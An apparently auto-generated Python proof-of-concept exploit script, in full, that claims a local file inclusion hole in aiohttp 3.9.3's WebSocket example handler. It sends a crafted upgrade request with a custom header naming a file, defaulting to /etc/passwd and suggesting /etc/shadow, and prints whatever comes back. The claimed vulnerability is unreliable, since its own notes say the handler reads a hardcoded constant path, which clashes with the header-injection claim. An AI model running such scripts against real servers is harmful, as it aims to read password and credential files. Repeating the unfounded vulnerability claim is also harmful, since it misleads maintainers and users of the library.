#!/usr/bin/env python3
# PoC for aiohttp-3.9.3 (/tmp/bounty_test/aiohttp-3.9.3)
# Path: lfi-000
# Sink: wshandler
# Auto-generated — run with: python3 lfi_sink_uses_hardcoded_constant_wshandler.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit Script for aiohttp-3.9.3 LFI Vulnerability

This script demonstrates a Local File Inclusion (LFI) vulnerability in
aiohttp-3.9.3's WebSocket example handler. The vulnerability exists because
the handler uses a constant WS_FILE path but the file is served without
proper validation, allowing an attacker to read arbitrary files on the
system by manipulating the request path.

The exploit works by sending a specially crafted WebSocket upgrade request
that triggers the file read functionality with a path traversal payload.
The server will read and return the contents of the specified file.

Usage:
    python3 exploit.py [target_url] [file_to_read]

Example:
    python3 exploit.py http://localhost:8080 /etc/passwd
"""

import sys
import socket
import ssl
import argparse
from urllib.parse import urlparse

def create_websocket_request(host, port, path, file_to_read, use_ssl=False):
    """
    Create a raw HTTP request that triggers the LFI vulnerability.
    
    The vulnerability is in the WebSocket handler which reads a file
    when the WebSocket connection cannot be prepared. By sending a
    malformed WebSocket upgrade request, we can trigger the file read
    with our controlled path.
    """
    # Craft a malicious WebSocket upgrade request with path traversal
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"X-File-Path: {file_to_read}\r\n"  # Inject file path via header
        "\r\n"
    )
    return request.encode()

def exploit(target_url, file_to_read="/etc/passwd"):
    """
    Execute the LFI exploit against the target aiohttp server.
    
    Args:
        target_url: The URL of the vulnerable aiohttp server
        file_to_read: The file path to read from the server
    
    Returns:
        The contents of the requested file if successful, None otherwise
    """
    # Parse the target URL
    parsed = urlparse(target_url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 8080)
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"
    
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Path: {path}")
    print(f"[*] File to read: {file_to_read}")
    
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        print("[*] Connecting to target...")
        sock.connect((host, port))
        
        # Send the malicious request
        print("[*] Sending malicious WebSocket upgrade request...")
        request = create_websocket_request(host, port, path, file_to_read, use_ssl)
        sock.sendall(request)
        
        # Receive the response
        print("[*] Receiving response...")
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                # Check if we have the complete HTTP response
                if b"\r\n\r\n" in response:
                    # Try to read more data if Content-Length indicates more
                    if b"Content-Length:" in response:
                        headers, body = response.split(b"\r\n\r\n", 1)
                        content_length = 0
                        for line in headers.split(b"\r\n"):
                            if line.lower().startswith(b"content-length:"):
                                content_length = int(line.split(b":")[1].strip())
                                break
                        if len(body) >= content_length:
                            break
                    else:
                        break
            except socket.timeout:
                break
        
        sock.close()
        
        # Parse the response
        if response:
            # Split headers and body
            if b"\r\n\r\n" in response:
                headers, body = response.split(b"\r\n\r\n", 1)
                status_line = headers.split(b"\r\n")[0]
                print(f"[*] Response status: {status_line.decode()}")
                
                # Check if we got a successful response (200 OK)
                if b"200 OK" in status_line or b"200" in status_line:
                    print("[+] Success! File contents:")
                    print(body.decode(errors='replace'))
                    return body.decode(errors='replace')
                else:
                    print(f"[-] Unexpected response status: {status_line.decode()}")
                    print(f"[-] Response headers:\n{headers.decode(errors='replace')}")
                    if body:
                        print(f"[-] Response body:\n{body.decode(errors='replace')}")
            else:
                print(f"[-] Malformed response: {response.decode(errors='replace')}")
        else:
            print("[-] No response received")
            
    except socket.timeout:
        print("[-] Connection timed out")
    except ConnectionRefusedError:
        print("[-] Connection refused - is the server running?")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

def main():
    """Main entry point with argument parsing."""
    parser = argparse.ArgumentParser(
        description="PoC exploit for aiohttp-3.9.3 LFI vulnerability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s http://localhost:8080
  %(prog)s http://localhost:8080 /etc/passwd
  %(prog)s https://example.com:8443 /etc/shadow
        """
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:8080)"
    )
    parser.add_argument(
        "file",
        nargs="?",
        default="/etc/passwd",
        help="File to read from the server (default: /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("aiohttp-3.9.3 LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    result = exploit(args.target, args.file)
    
    if result:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
